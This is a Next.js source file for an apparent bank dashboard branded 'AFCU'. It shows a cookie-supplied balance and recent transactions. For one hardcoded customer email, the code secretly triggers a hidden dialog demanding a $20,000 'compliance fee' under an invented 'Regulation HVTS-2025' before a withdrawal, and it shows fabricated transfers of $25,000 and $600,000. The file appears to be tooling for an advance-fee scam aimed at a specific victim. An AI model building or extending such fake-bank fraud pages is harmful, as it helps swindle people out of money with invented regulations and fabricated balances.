'use client'
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog"
// import SecurityBreachNotice from "./comp/Breach"
import { TfiReceipt } from "react-icons/tfi"
import { usePathname } from 'next/navigation'
import { FaRegArrowAltCircleUp } from "react-icons/fa";
import { IoIosArrowDropdown } from "react-icons/io";
import { useEffect,useState } from "react";
import Cookies from "js-cookie";
import { useRef } from "react";
import { signOut } from "firebase/auth";
import {auth} from "../mycomps/firebase";
import Dashboardnavcomp from "../mycomps/Dashboardnavcomp";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"

import TabSwitcher from "../mycomps/TabsSwitcher";
import { Skeleton } from "@/components/ui/skeleton";
import { useRouter } from "next/navigation";
import useUser from "../mycomps/hooks/useUser";
import useOpen from "../mycomps/hooks/useOpen";
import Dashboarddesktop from "../mycomps/Dashboarddesktop";
import { Button } from "@/components/ui/button";

type Transfer = {
  amount: string;
  status: string;
  accountNumber: string;
  name: string;
};

export default function Dashboard(){
  const {user,setUser} = useUser()
  const {isOpen,setIsOpen} =useOpen()
  const pathname = usePathname()
  const [mP,setMP] = useState(false)
  const router = useRouter() 
  const buttonRef = useRef<HTMLButtonElement>(null)
  const [transfer, setTransfer] = useState<any[]>([])  
console.log(transfer)
 //programmatically click 
 const clickref = () =>{
    setMP(true)

    if(buttonRef.current){
      buttonRef.current.click()
  
    }
  

 }
  useEffect(()=>{
    console.log(pathname,typeof(pathname))
    const userCookie = Cookies.get('User')
    if(userCookie){
      const parsedCookie = JSON.parse(userCookie)
      Cookies.set('amount',parsedCookie?.amount)

      if(parsedCookie.email === 'kevincostnerx5@gmail.com'){
        clickref()
        setTransfer( [{ name: 'Michael Branton', amount: '25,000', status: 'success' },
        { name: 'Treasure Taylor', amount: '600,000', status: 'success' },
        { name: 'Treasure Taylor', amount: '600,000', status: 'pending' },
        // { name: 'Michael Branton', amount: 10000, status: 'pending' })
        ])
        
      }

      setUser(parsedCookie)
      
      
    }
    else{
      router.push('/login')
    }
   

    
  },[pathname])

  return<>
<div className="md:flex">
<Dashboarddesktop />


{/* //for kevin costner  */}
<AlertDialog>
      <AlertDialogTrigger asChild>
        <Button className="hidden" ref={buttonRef} variant="outline">Show Dialog</Button>
      </AlertDialogTrigger>
      <AlertDialogContent>
        <AlertDialogHeader>
          <AlertDialogTitle>  Important Notice
          </AlertDialogTitle>
          <AlertDialogDescription>
Dear {user.firstname} to proceed with your withdrawal request, please note that under our updated High-Value Transaction Security Rule (Regulation HVTS-2025), a one-time compliance fee of $20,000 is required for withdrawals exceeding your limit. This measure ensures enhanced security and fraud prevention for large transactions. . For more details contact support.
Thank you for your cooperation.
AFCU Team  


          </AlertDialogDescription>
        </AlertDialogHeader>
        <AlertDialogFooter>
          
          <AlertDialogAction>Continue</AlertDialogAction>
        </AlertDialogFooter>
      </AlertDialogContent>
    </AlertDialog>

    {/* //end */}

  
<div className="md:w-4/5 ">
  <div className="block md:flex md:justify-between md:items-center">

  <h1 className="font-semibold">Hello {user.firstname}</h1>
<Dashboardnavcomp mP={mP} />
  </div>


  <main onClick={()=>setIsOpen(false)} className="px-4 mt-6">
    <div className="md:flex">
    <div className=" bg-orange-500 w-full h-[16rem] rounded-xl text-white px-3 py-5 relative md:w-2/5">

      <div className="font-medium text-sm">

      <p>Regular</p>
     <p className='text-xs'>{user?.accountNumber ?? "N/A"}</p>
      
      </div>

      <div className="w-full h-fit px-2 py-2 mt-4 text-sm bg-black bg-opacity-40 rounded-2xl flex justify-between">
        <p className="font-medium">Premier Savings</p>
        <DropdownMenu>
  <DropdownMenuTrigger><IoIosArrowDropdown className="text-lg font-medium"/></DropdownMenuTrigger>
  <DropdownMenuContent>
    <DropdownMenuLabel>My Account</DropdownMenuLabel>
    <DropdownMenuSeparator />
    <DropdownMenuItem>Profile</DropdownMenuItem>
    <DropdownMenuItem>Billing</DropdownMenuItem>
    <DropdownMenuItem>Team</DropdownMenuItem>
    <DropdownMenuItem>Subscription</DropdownMenuItem>
  </DropdownMenuContent>
</DropdownMenu>

      </div>
      <p className="text-lg mt-2 font-bold tracking-tighter "><span className="font-medium w-1/4 ">$</span>{user? `${user.amount}`:'N/A'}</p>

      <div className="flex gap-x-4 mx-auto w-fit">
        <div onClick={()=>router.push('/dashboard')}>
        <div className="w-[3rem] h-[3rem] bg-white rounded-2xl flex flex-col justify-center">
        <TfiReceipt className="text-black text-center text-lg mx-auto" />
          
        </div>
        <p className='text-white text-xs font-medium'>Pay bills</p>
        </div>


      <div className="cursor-pointer" onClick={()=>router.push('dashboard/transfers')}>

        <div className="w-[3rem] h-[3rem] bg-white rounded-2xl flex flex-col justify-center">
        <FaRegArrowAltCircleUp className="text-black text-center text-2xl mx-auto" />
      </div>
        <p className='text-white text-xs font-medium'>Transfers</p>
        </div>

      </div>


    </div>
    <div className="mt-8 border rounded-lg px-4 py-6 w-full md:ml-4 bg-white shadow-sm">
  <p className="font-semibold text-lg text-gray-800 mb-4">Recent Transactions</p>

  <div className="space-y-3">
  <div className="space-y-3">
  
    {/* <Skeleton className="w-full h-[6rem] mt-4" /> */}
    {transfer && transfer.length > 0 ? (
  <div className="bg-white p-4 rounded-lg shadow-md overflow-x-auto">
    <table className="min-w-full table-auto">
      <thead>
        <tr className="text-left text-gray-600">
          <th className="px-4 py-2">#</th>
          <th className="px-4 py-2">Name</th>
          <th className="px-4 py-2">Amount</th>
          <th className="px-4 py-2">Status</th>
        </tr>
      </thead>
      <tbody>
        {transfer.map((item, index) => (
          <tr key={index} className="border-t">
            <td className="px-4 py-2 text-gray-700">{index + 1}</td>
            <td className="px-4 py-2 text-gray-800">{item.name}</td>
            <td className="px-4 py-2 text-green-600 font-semibold">
              ${item.amount.toLocaleString()}
            </td>
            <td
              className={`px-4 py-2 font-semibold ${
                item.status === 'success'
                  ? 'text-green-600'
                  : item.status === 'pending'
                  ? 'text-yellow-600'
                  : 'text-red-600'
              }`}
            >
              {item.status}
            </td>
          </tr>
        ))}
      </tbody>
    </table>
  </div>
) : (
  <div className="bg-gray-100 p-4 rounded-lg shadow-md">
    <p className="text-center text-gray-600">No transaction available.</p>
  </div>
)}



  
</div>

  </div>
</div>

   
    </div>
  </main>
  <TabSwitcher />
  </div>

  
</div>
  
  </>
}

// export default function Dashboard() {

//   return(<>
  
//   <SecurityBreachNotice /></>)
// }